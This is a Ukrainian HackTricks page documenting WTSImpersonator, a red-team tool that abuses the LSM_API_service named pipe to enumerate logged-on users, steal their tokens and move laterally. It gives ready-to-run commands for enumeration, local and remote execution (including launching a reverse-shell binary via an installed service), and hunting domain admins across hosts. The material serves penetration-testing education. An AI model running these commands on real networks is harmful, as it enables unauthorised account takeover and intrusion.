<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.

</details>

The **WTS Impersonator** інструмент використовує **"\\pipe\LSM_API_service"** RPC іменовану канал для недолічливого переліку ввійшовших користувачів та захоплення їх токенів, обхід традиційних технік імітації токенів. Цей підхід сприяє безшовному бічному руху в мережах. Інновація за цією технікою належить **Omri Baso, чию роботу можна знайти на [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Основна функціональність
Інструмент працює за допомогою послідовності викликів API:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Ключові модулі та використання
- **Перелік користувачів**: Локальний та віддалений перелік користувачів можливий за допомогою цього інструменту, використовуючи команди для обох сценаріїв:
- Локально:
```powershell
.\WTSImpersonator.exe -m enum
```
- Віддалено, вказавши IP-адресу або ім'я хоста:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Виконання команд**: Модулі `exec` та `exec-remote` потребують контексту **Служби**, щоб працювати. Локальне виконання просто потребує виконуваного файлу WTSImpersonator та команди:
- Приклад для локального виконання команди:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe може бути використаний для отримання контексту служби:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Віддалене виконання команд**: Передбачає створення та встановлення служби віддалено, схоже на PsExec.exe, що дозволяє виконання з відповідними дозволами.
- Приклад віддаленого виконання:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Модуль пошуку користувачів**: Спрямований на конкретних користувачів на кількох машинах, виконання коду від їх облікових даних. Це особливо корисно для спрямування на адміністраторів домену з правами локального адміністратора на кількох системах.
- Приклад використання:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
